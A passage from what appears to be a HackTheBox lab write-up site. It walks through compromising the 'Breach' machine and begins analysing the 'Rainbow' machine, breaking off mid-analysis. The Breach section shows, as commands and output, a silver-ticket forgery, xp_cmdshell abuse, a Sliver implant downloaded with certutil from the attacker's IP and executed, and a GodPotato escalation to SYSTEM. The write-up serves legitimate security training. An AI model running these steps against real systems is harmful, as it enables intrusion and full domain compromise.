</p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-ticketer -domain breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl:1433 -nthash 69596c7aa1e8daee17f8e78870e25a5c christine.bruce\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for breach.vl/christine.bruce\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in christine.bruce.ccache\n</code></pre><p></p> <p>My access when connecting to the mssql instance with these credentials is dbo </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/christine.bruce.ccache impacket-mssqlclient -k -no-pass breach.vl/christine.bruce@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Administrator  dbo@master)&gt;\n</code></pre><p></p> <p>Enable xp_cmdshell </p><pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; enable_xp_cmdshell\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n</code></pre><p></p> <p>Start sliver-server, enabling multiplayer, also stand up an mtls listener on 8443 with a timeout of 240. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-server\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n\nAll hackers gain annihilator\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\n[server] sliver &gt; multiplayer \n\n[*] Multiplayer mode enabled!\n\n[server] sliver &gt; mtls -t 240 --lport 8443\n\n[*] Starting mTLS listener ...\n\n[*] Successfully started job #3\n\n[server] sliver &gt;\n</code></pre><p></p> <p>Generate a new operator profile </p><pre><code>[server] sliver &gt; new-operator --lhost 10.10.14.204 --save duff --name duff\n\n[*] Generating new client certificate, please wait ... \n[*] Saved new client config to: /home/notroot/htb/machines/breach/duff \n</code></pre><p></p> <p>In another shell, import the profile into sliver-client.  Connect. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client import duff\n2025/10/25 03:26:23 Saved new client config to: /home/notroot/.sliver-client/configs/duff_10.10.14.204.cfg\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client\n? Select a server: duff@10.10.14.204 (a0e0ed1e78716827)\nConnecting to 10.10.14.204:31337 ...\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n.------..------..------..------..------..------.\n|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |\n| :/\\: || :/\\: || (\\/) || :(): || (\\/) || :(): |\n| :\\/: || (__) || :\\/: || ()() || :\\/: || ()() |\n| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|\n`------'`------'`------'`------'`------'`------'\n\nAll hackers gain assist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver &gt;\n</code></pre><p></p> <p>Generate an implant </p><pre><code>sliver &gt; generate -l -G -t 240 -m 10.10.14.204:8443 -a amd64 -o windows -j 60 -s a.exe\n\n[*] Generating new windows/amd64 implant binary\n[!] Symbol obfuscation is disabled\n[*] Build completed in 2s\n[*] Implant saved to /home/notroot/htb/machines/breach/a.exe\n</code></pre><p></p> <p>Serve it </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ python3 -m http.server 443\nServing HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...\n</code></pre><p></p> <p>On the mssqlclient, use xp_cmdshell to download the implant to the host</p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c certutil -urlcache -split -f http://10.10.14.204:443/a.exe  \\windows\\tasks\\a.exe\noutput                                                \n---------------------------------------------------   \n****  Online  ****                                    \n\n  000000  ...                                         \n\n  988a00                                              \n\nCertUtil: -URLCache command completed successfully.   \n\nNULL \n</code></pre> <p>Invoke the implant </p><pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c \\windows\\tasks\\a.exe\n</code></pre><p></p> <p>The user context is high integrity, with SeImpersonatePrivilege. </p><pre><code>PS C:\\Windows\\system32&gt; whoami /groups\nwhoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                                             Attributes                                        \n========================================== ================ =============================================================== ==================================================\nEveryone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group\nNT SERVICE\\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    \nLOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288                                                                                                      \nPS C:\\Windows\\system32&gt; whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\nPS C:\\Windows\\system32&gt; whoami /user\nwhoami /user\n\nUSER INFORMATION\n----------------\n\nUser Name        SID                                          \n================ =============================================\nbreach\\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Breach/#escalate","title":"Escalate","text":"<p>Upload GodPotato.exe </p><pre><code>sliver (COLOURFUL_GUILTY) &gt; upload /var/www/html/GodPotato-NET4.exe /windows/tasks/godpotato.exe\n\n[*] Wrote file to C:\\windows\\tasks\\godpotato.exe\n</code></pre><p></p> <p>Loosen dacls around the implant </p><pre><code>$path=\"c:\\windows\\tasks\"; (Get-ChildItem -path $path\\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"Everyone\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}\n</code></pre><p></p> <p>Godpotato for escalation </p><pre><code>PS C:\\Windows\\system32&gt; cd \\windows\\tasks\ncd \\windows\\tasks\nPS C:\\windows\\tasks&gt; .\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n.\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n[*] CombaseModule: 0x140732047294464\n[*] DispatchTable: 0x140732049885048\n[*] UseProtseqFunction: 0x140732049177392\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\01d890f9-0469-4a71-8628-fee24a4b0d37\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00005802-03c8-ffff-60ec-ae3827a25927\n[*] DCOM obj OXID: 0x6a8455b40cabdba3\n[*] DCOM obj OID: 0xa9eaaee4bb2b2694\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 916 Token:0x628  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 3004\n</code></pre><p></p> <p>On the new session, I am system. </p><pre><code>sliver (COLOURFUL_GUILTY) &gt; info\n\n        Session ID: c80f5dd8-d782-4bbf-abf6-1b18fb9fd2f5\n              Name: COLOURFUL_GUILTY\n          Hostname: BREACHDC\n              UUID: 91753042-9532-69dc-dbc7-e9484b42f13e\n          Username: NT AUTHORITY\\SYSTEM\n               UID: S-1-5-18\n               GID: S-1-5-18\n               PID: 7056\n                OS: windows\n           Version: Server 2016 build 20348 x86_64\n            Locale: en-US\n              Arch: amd64\n         Active C2: mtls://10.10.14.204:8443\n    Remote Address: 10.129.38.236:63285\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n      Last Checkin: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n\nsliver (COLOURFUL_GUILTY) &gt; getuid\n\nS-1-5-18\n\nsliver (COLOURFUL_GUILTY) &gt; whoami\n\nLogon ID: NT AUTHORITY\\SYSTEM\n[*] Current Token ID: NT AUTHORITY\\SYSTEM\n</code></pre><p></p> <p>Flag </p><pre><code>sliver (COLOURFUL_GUILTY) &gt; cat c:/users/administrator/desktop/root.txt\n\nfc98f418f94f8cdb9a30ef026fe64345\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/","title":"Rainbow","text":""},{"location":"writeups/HackTheBox/Machines/Rainbow/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.234.171\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 11:40 PDT\nNmap scan report for 10.129.234.171\nHost is up (0.14s latency).\nNot shown: 993 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 01-18-22  08:22AM                  258 dev.txt\n| 01-18-22  08:30AM                54784 rainbow.exe\n| 01-16-22  01:34PM                  479 restart.ps1\n|_01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RAINBOW\n|   NetBIOS_Domain_Name: RAINBOW\n|   NetBIOS_Computer_Name: RAINBOW\n|   DNS_Domain_Name: rainbow\n|   DNS_Computer_Name: rainbow\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-10-25T18:44:06+00:00\n|_ssl-date: 2025-10-25T18:44:45+00:00; +2s from scanner time.\n| ssl-cert: Subject: commonName=rainbow\n| Not valid before: 2025-10-24T18:35:40\n|_Not valid after:  2026-04-25T18:35:40\n8080/tcp open  http-proxy\n|_http-title: Dev Wiki powered by Rainbow Webserver\n| fingerprint-strings: \n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Cache-Control: no-cache, private\n|     Content-Type: text/html\n|     X-Powered-By: Rainbow 0.1\n|     Content-Length: 1478\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\" /&gt;\n|     &lt;title&gt;Dev Wiki powered by Rainbow Webserver&lt;/title&gt;\n|     &lt;style&gt; \n|     .rainbow {\n|     font-size: 24pt;\n|     background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red); -webkit-background-clip: text;\n|     color: transparent;\n|     body {\n|     display: flex;\n|     justify-content: center;\n|     align-items: center;\n|     text-align: center;\n|     min-height: 100vh;\n|     &lt;/style&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;!-- \n|     Under Development, please come back later --&gt;\n|     &lt;pre class=\"rainbow\"&gt;\n|     _.--'_......----........\n|     _,i,,-'' __,,...........___\n|_    ,;-' _.--'' ___,,...\n|_http-open-proxy: Proxy might be redirecting requests\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=10/25%Time=68FD19C3%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,646,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nCache-Control:\\x20no-cache,\\x2\nSF:0private\\r\\nContent-Type:\\x20text/html\\r\\nX-Powered-By:\\x20Rainbow\\x200\nSF:\\.1\\r\\nContent-Length:\\x201478\\r\\n\\r\\n\\xef\\xbb\\xbf&lt;!DOCTYPE\\x20html&gt;\\n\\\nSF:n&lt;html\\x20lang=\\\"en\\\"\\x20xmlns=\\\"http://www\\.w3\\.org/1999/xhtml\\\"&gt;\\n&lt;he\nSF:ad&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20/&gt;\\n\\x20\\x20\\x20\\x20\nSF:&lt;title&gt;Dev\\x20Wiki\\x20powered\\x20by\\x20Rainbow\\x20Webserver&lt;/title&gt;\\n\\x\nSF:20\\x20\\x20\\x20&lt;style&gt;\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\.rainbow\\x20{\\n\\t\\tfont-size:\\x2024pt;\\n\\t\\tbackground-image:\\x20linea\nSF:r-gradient\\(to\\x20left,\\x20violet,\\x20indigo,\\x20blue,\\x20green,\\x20yel\nSF:low,\\x20orange,\\x20red\\);\\x20\\x20\\x20-webkit-background-clip:\\x20text;\\\nSF:n\\x20\\t\\tcolor:\\x20transparent;\\n\\t}\\n\\tbody\\x20{\\n\\x20\\x20\\t\\tdisplay:\nSF:\\x20flex;\\n\\x20\\x20\\t\\tjustify-content:\\x20center;\\n\\x20\\t\\t\\x20align-i\nSF:tems:\\x20center;\\n\\x20\\x20\\t\\ttext-align:\\x20center;\\n\\x20\\x20\\t\\tmin-h\nSF:eight:\\x20100vh;\\n\\t}\\n\\x20\\x20\\x20\\x20&lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n\\x20\\\nSF:x20\\x20\\x20&lt;!--\\x20\\xf0\\x9f\\x8c\\x88\\x20Under\\x20Development,\\x20please\\\nSF:x20come\\x20back\\x20later\\x20--&gt;\\n\\n\\n\\x20\\x20\\x20\\x20\\x20&lt;pre\\x20class=\nSF:\\\"rainbow\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\.--'_\\.\\.\\.\\.\\.\\.-\nSF:---\\.\\.\\.\\.\\.\\.\\.\\.\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_,i,,-''\\x20__,,\\.\\.\\.\\.\\\nSF:.\\.\\.\\.\\.\\.\\.___\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20,;-'\\x20_\\.--''\\x20\\x20\\x20\\x20___,,\nSF:\\.\\.\\.\")%r(HTTPOptions,646,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nCache-Control:\\x2\nSF:0no-cache,\\x20private\\r\\nContent-Type:\\x20text/html\\r\\nX-Powered-By:\\x2\nSF:0Rainbow\\x200\\.1\\r\\nContent-Length:\\x201478\\r\\n\\r\\n\\xef\\xbb\\xbf&lt;!DOCTYP\nSF:E\\x20html&gt;\\n\\n&lt;html\\x20lang=\\\"en\\\"\\x20xmlns=\\\"http://www\\.w3\\.org/1999/\nSF:xhtml\\\"&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20/&gt;\\n\\x2\nSF:0\\x20\\x20\\x20&lt;title&gt;Dev\\x20Wiki\\x20powered\\x20by\\x20Rainbow\\x20Webserve\nSF:r&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\.rainbow\\x20{\\n\\t\\tfont-size:\\x2024pt;\\n\\t\\tbackground-im\nSF:age:\\x20linear-gradient\\(to\\x20left,\\x20violet,\\x20indigo,\\x20blue,\\x20\nSF:green,\\x20yellow,\\x20orange,\\x20red\\);\\x20\\x20\\x20-webkit-background-cl\nSF:ip:\\x20text;\\n\\x20\\t\\tcolor:\\x20transparent;\\n\\t}\\n\\tbody\\x20{\\n\\x20\\x2\nSF:0\\t\\tdisplay:\\x20flex;\\n\\x20\\x20\\t\\tjustify-content:\\x20center;\\n\\x20\\t\nSF:\\t\\x20align-items:\\x20center;\\n\\x20\\x20\\t\\ttext-align:\\x20center;\\n\\x20\nSF:\\x20\\t\\tmin-height:\\x20100vh;\\n\\t}\\n\\x20\\x20\\x20\\x20&lt;/style&gt;\\n&lt;/head&gt;\\n\nSF:&lt;body&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20\\xf0\\x9f\\x8c\\x88\\x20Under\\x20Developmen\nSF:t,\\x20please\\x20come\\x20back\\x20later\\x20--&gt;\\n\\n\\n\\x20\\x20\\x20\\x20\\x20&lt;\nSF:pre\\x20class=\\\"rainbow\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\.--'_\nSF:\\.\\.\\.\\.\\.\\.----\\.\\.\\.\\.\\.\\.\\.\\.\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_,i,,-''\\x20\nSF:__,,\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.___\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20,;-'\\x20_\\.--''\\x20\\x20\nSF:\\x20\\x20___,,\\.\\.\\.\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 2s, deviation: 0s, median: 2s\n| smb2-time: \n|   date: 2025-10-25T18:44:10\n|_  start_date: N/A\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   162.97 ms 10.10.14.1\n2   163.08 ms 10.129.234.171\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 243.61 seconds\n</code></pre> <p>The machine doesn't have ports typically associated with domain controllers exposed.  But it does have FTP exposed, and its allowing anonymous login: </p><pre><code>21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 01-18-22  08:22AM                  258 dev.txt\n| 01-18-22  08:30AM                54784 rainbow.exe\n| 01-16-22  01:34PM                  479 restart.ps1\n|_01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n</code></pre><p></p> <p>Download the files </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow]\n\u2514\u2500$ ftp rainbow.htb\nConnected to rainbow.htb.\n220 Microsoft FTP Service\nName (rainbow.htb:notroot): Anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||50101|)\n125 Data connection already open; Transfer starting.\n01-18-22  08:22AM                  258 dev.txt\n01-18-22  08:30AM                54784 rainbow.exe\n01-16-22  01:34PM                  479 restart.ps1\n01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n226 Transfer complete.\nftp&gt; binary\n200 Type set to I.\nftp&gt; mget *\nmget dev.txt [anpqy?]? a\nPrompting off for duration of mget.\n229 Entering Extended Passive Mode (|||50103|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************|   258        2.51 KiB/s    00:00 ETA\n226 Transfer complete.\n258 bytes received in 00:00 (2.47 KiB/s)\n229 Entering Extended Passive Mode (|||50104|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************| 54784      172.75 KiB/s    00:00 ETA\n226 Transfer complete.\n54784 bytes received in 00:00 (172.63 KiB/s)\n229 Entering Extended Passive Mode (|||50105|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************|   479        4.79 KiB/s    00:00 ETA\n226 Transfer complete.\n479 bytes received in 00:00 (4.76 KiB/s)\n</code></pre><p></p> <p>The <code>dev.txt</code> calls out a <code>restart script</code> and mentions that the application is rotated through ports <code>8080-8090</code> when the webapp crashes. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ cat dev.txt \n* Our webserver has been crashing a lot lately. Instead of touching the code we added a restart script! \n* The server will dynamically pick a port when its default port is unresponsive (8080-8090).\n* We'll fix this later by adding load balancer.\n\n- dev team\n</code></pre><p></p> <p>The <code>restart.ps1</code> discloses that the adjacent <code>rainbow.exe</code> is found at <code>c:\\rainbow\\rainbow.exe</code> </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ cat restart.ps1 \nSet-Location -Path c:\\rainbow\nfor(;;){\ntry{\nIf (!(Get-Process -Name rainbow -ErrorAction SilentlyContinue))\n{Invoke-Expression \"C:\\rainbow\\rainbow.exe\" }\n$proc = Get-Process -Name rainbow | Sort-Object -Property ProcessName -Unique -ErrorAction SilentlyContinue\nIf (!$proc -or ($proc.Responding -eq $false) \u2013or ($proc.WorkingSet -GT 200000*1024)) {\n$proc.Kill()\nStart-Sleep -s 10\nInvoke-Expression \"C:\\rainbow\\rainbow.exe\"}\n}\ncatch    {    }\nStart-sleep -s 30\n}\n</code></pre><p></p> <p>Port 80 is a default IIS start page. Port 8080 is the development webapp, its homepage aligns with the <code>index.html</code> found in the <code>wwwroot</code> directory in the FTP share.</p> <p></p> <p>Anonymous access doesn't allow upload to the FTP share, so straight to webshell is off the table.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#static-analysis","title":"Static Analysis","text":"<p>I tried analyzing the <code>rainbow.exe</code> using <code>AvaloniaILSpy</code> (https://github.com/icsharpcode/AvaloniaILSpy) but the executable isn't managed code:</p> <p></p> <p>Examining the binary in <code>Ghidra</code>, I find that the binary has a number of imports, one of which is <code>ws2_32.dll</code>.  A good sign the binary features network connection-related operations.</p> <p></p> <p>Following the entrypoint, a stack cookie is set up, and a single function is called, which had another name but I renamed it \"main\", which seems fitting in this context.</p> <p></p> <p>Following the <code>main()</code> function, there is not much to be said about the first two -thirds of the function; likely initialization of the console.  However the near-end of the function starts a webserver, seems to get the address of a loaded module, and an ESI is returned if in good standing. All other scenarios lead to raising SEH exception.  </p> <p></p> <p>Examining the <code>start_webserver()</code> function.</p> <p></p> <p>The function on line 8 I named <code>std_cout</code>, because it seems like that's what its doing is directing stdout to console.</p> <p>Lines 9 and 11  are setting the port range talked about in the <code>dev.txt</code>.   Well, not quite, because that said <code>8080-8090</code>, this clearly won't work for ports <code>8089</code> and <code>8090</code>. </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo \"ibase=16; obase=A; 1F90\" | bc\n8080\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo \"ibase=16; obase=A; 1F99\" | bc\n8089\n</code></pre> <p>Not entirely sure what the function on 14 is doing, my best guess is it is creating and storing a  <code>HostInfo</code>  struct.  The struct isn't used by the server, it's used by the client.</p> <p>The function on line 15 I named <code>socket_bind_server</code> because I found it was calling a bunch of functions by ordinals, those ordinals align with <code>ws2_32</code> and I found them translate in the following order, which I commented inline in the disasm.  </p> <pre><code>/* https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E 82C18B4677F89.html\n\n/* WSAStartup  115  Exported Function */\n/* socket  23  Exported Function */\n/* WSAGetLastError  111  Exported Function */\n/* htons  9  Exported Functio */\n/* bind  2  Exported Function */\n/* setsockopt  21  Exported Function */\n/* listen  13  Exported Function */\n</code></pre> <p>The other function I named <code>sock_client</code> because I found it to be calling functions by ordinal that align with a spawned socket client: </p><pre><code>/* select  18  Exported Function */\n/* accept  1  Exported Function */\n/* recv  16  